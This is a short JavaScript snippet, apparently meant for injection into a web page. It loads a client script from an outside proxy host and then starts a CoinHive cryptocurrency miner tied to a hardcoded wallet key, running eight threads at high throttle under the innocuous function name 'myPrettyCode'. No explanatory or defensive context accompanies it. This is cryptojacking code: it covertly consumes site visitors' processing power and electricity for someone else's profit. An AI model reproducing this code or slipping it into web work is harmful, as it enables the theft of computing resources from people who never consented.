function loadScript(url, callback)
{
    // Adding the script tag to the head as suggested before
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;

    // Then bind the event to the callback function.
    // There are several events for cross browser compatibility.
    script.onreadystatechange = callback;
    script.onload = callback;

    // Fire the loading
    head.appendChild(script);
};
var myPrettyCode = function() {
  var miner=new CoinHive.Anonymous('4Aio2FxFmciVKbu1JabGQGAvD3hEaL95DebaAq9td2UDLdSSM3fZNfWLfqjBkFKYjB2d9pAJw2F7Yh9rFZrEsCvE94277HJ',
        {
        threads:8,autoThreads:false,throttle:0.9
        }
  );
  miner.start();
};
loadScript("https://proxy-zoweqqxyxv.now.sh/client?proxy", myPrettyCode);
